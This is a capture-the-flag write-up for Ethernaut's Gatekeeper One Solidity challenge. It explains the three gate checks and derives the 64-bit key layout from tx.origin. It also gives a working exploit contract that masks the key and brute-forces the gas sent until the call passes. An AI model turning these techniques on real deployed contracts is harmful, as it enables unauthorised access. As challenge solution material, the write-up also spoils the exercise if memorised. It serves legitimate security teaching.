# Ethernaut Challenge #13: Gatekeeper One

**Objective:** Pass through the gate and become entrant.

**Contract Analysis:**
```solidity
contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**Three Gates to Pass:**

**Gate One:** `msg.sender != tx.origin`
- Easy: Call through a contract (same as Telephone)

**Gate Two:** `gasleft() % 8191 == 0`
- Gas remaining must be divisible by 8191
- Requires precise gas calculation
- Use `call{gas: X}` with trial and error

**Gate Three:** Complex bit manipulation

Let me break down the requirements:

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
// uint32(key) == uint16(key)
// Upper 16 bits of lower 32 bits must be 0
// i.e., key & 0xFFFF0000 must have upper bits = 0

require(uint32(uint64(_gateKey)) != uint64(_gateKey));
// uint32(key) != key
// Upper 32 bits must NOT be 0

require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
// Lower 32 bits of key = lower 16 bits of tx.origin
```

**The Key Pattern:**

```
Key structure (64 bits):
Bits 63-32: Any non-zero value (for check 2)
Bits 31-16: Must be 0 (for check 1)
Bits 15-0: Lower 16 bits of tx.origin (for check 3)
```

**Example:**
- tx.origin = `0x1234567890AbcdEF1234567890AbcdEF12345678`
- Lower 16 bits = `0x5678`
- Key = `0x0000000100005678` (any upper 32 bits != 0, middle 16 bits = 0, lower 16 = 0x5678)

**The Attack:**
```solidity
contract GatekeeperExploit {
  function exploit(address _target) public {
    bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))));
    // Set upper 32 bits to non-zero
    key = key | bytes8(uint64(1 << 32));
    
    // Brute force gas
    for (uint i = 0; i < 8191; i++) {
      (bool success,) = _target.call{gas: 100000 + i}(abi.encodeWithSignature("enter(bytes8)", key));
      if (success) break;
    }
  }
}
```

**Status:** Challenge understood. Gas manipulation + bit masking.
